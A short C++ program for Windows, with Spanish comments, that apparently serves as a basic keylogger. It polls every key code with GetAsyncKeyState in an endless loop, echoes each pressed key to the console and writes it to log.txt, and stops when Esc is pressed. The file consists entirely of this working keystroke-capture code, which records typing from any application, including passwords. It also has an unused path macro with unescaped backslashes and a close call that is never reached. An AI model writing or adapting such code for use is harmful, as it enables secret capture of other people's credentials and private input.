#include <iostream> //Libreria input output
#include <Windows.h> //Libreria Manejo de SOS windows 
#include <fstream> 
using namespace std;
#define LOGFILE "C:\Users\Juan Jose\Documents\Log"

int main(int argc, char** argv)
{
	ofstream archivo("log.txt");
	BYTE keyState[256];
	
	while (true) {
		

        for (int key = 0; key < 256; key++) {
            // Comprueba si la tecla está presionada
            if (GetAsyncKeyState(key) & 0x8000) {
                cout << "Tecla presionada: " << key << endl;
                archivo << key << endl;
                // Si es la tecla Esc (código 27), sale del bucle
                if (key == 27) {
                    cout << "Saliendo..." << endl;
                    return 0;
                }
            }
        }

		Sleep(100);



	}
	archivo.close();



	return 0;

}